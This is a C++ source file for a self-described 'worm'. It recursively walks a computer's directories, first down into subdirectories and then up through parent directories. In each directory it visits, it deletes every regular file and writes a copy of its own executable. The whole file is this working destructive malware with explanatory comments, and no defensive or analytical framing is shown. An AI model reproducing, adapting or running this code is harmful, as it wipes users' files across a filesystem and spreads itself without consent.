#include <filesystem>
#include <iostream>
#include <fstream>
#include <vector>
#include "dir-hist.h"

DirectoryHistory dirhist;
std::string first_origin = std::filesystem::current_path();
std::string file_path = first_origin + "/worm";

// This function is responsible to enumerate the sub directories
// inside the path variable passed
std::vector<std::string> checkSubDir(const std::string &path) {
    // Declare sub_dirs vector variable
    std::vector<std::string> sub_dirs;

    // Loops through all entries inside the passed variable path
    for(const auto &entry : std::filesystem::directory_iterator(path)) {
        // checks if the entry is a directory
        // If true, append it to the vector sub_dirs
        if (entry.is_directory()) {
            std::string sub = entry.path().filename().string();
            sub_dirs.push_back(sub);
        }
    }

    return sub_dirs;
}

// This function is responsible to look to all files inside
// a directory path and delete them all
void deleteAll(std::string path) {
    // Loops through all entries inside the passed variable path
    for (const auto &entry : std::filesystem::directory_iterator(path)) {
        // checks if the entry is a regular file
        // If true, deletes it
        if (std::filesystem::is_regular_file(entry)) {
            std::filesystem::remove(entry);
        }
    }
}

// This function is responsible to copy the worm executable
// file into the destination path
void propagate(std::string destination) {
    // Opens original worm executable in readable binary mode
    std::ifstream worm(file_path, std::ios::binary);
    // Creates a new worm file in the destiation directory in
    // writable binary mode
    std::ofstream dst_worm(destination + "/worm", std::ios::binary);
    // Declares a buffer to make the writing
    char buffer[2048];

    // while buffer is not completely read, write to a file
    while (worm.read(buffer, sizeof(buffer))) {
        dst_worm.write(buffer, worm.gcount());
    }

    // Close file streams
    dst_worm.close();
    worm.close();
}

// This function is responsible to recursively navigate through all
// directories in the target computer, copying the worm malware and deleting
// all other files in it
std::filesystem::path exploit(std::filesystem::path origin, std::vector<std::string> sub_dirs) {
    // Declaring origin as string variable
    std::string origin_str = origin.string();
    // Adds origin to directory history
    dirhist.addDirectory(origin_str);
    
    // Loops through all sub directories and navigate inside them
    for (const std::string &sub : sub_dirs) {
        // Path to subdirectory variable
        std::string path_to_sub_str = origin_str + "/" + sub;
        // check if the current sub was not already
        // visited by the program.
        // If it is not visited, adds to the dirhist
        // enumerates all sub directories inside it
        // changes the origin to the current subdir path
        // deletes all files in the current subdir
        // propagates the worm into it
        // recursively call the exploit with new origin and sub_dirs
        if (!dirhist.directoryExists(path_to_sub_str)) {
            dirhist.addDirectory(path_to_sub_str);
            // checks if there are subs inside sub
            std::vector<std::string> subs_inside = checkSubDir(path_to_sub_str);
            // new origin
            std::filesystem::path new_origin(path_to_sub_str);
            // deletes all files in current sub
            deleteAll(path_to_sub_str);
            // propagates the worm
            propagate(path_to_sub_str);
            // recursion
            return exploit(new_origin, subs_inside);
        }
    }

    // If there are not sub directories and worm was already
    // copied, goes back to the parent directory and recursively
    // call the exploit again
    std::filesystem::path parent = origin.parent_path();
    std::string parent_str = parent.string();
    std::vector<std::string> parent_subs = checkSubDir(parent_str);
    // deletes all files in parent dir
    deleteAll(parent_str);
    // propagates the worm into the parent dir
    propagate(parent_str);
    // recursion
    return exploit(parent, parent_subs);
}

int main() {
    // checks for subdirs for first iteration
    std::vector<std::string> subs = checkSubDir(first_origin);
    exploit(first_origin, subs);
}


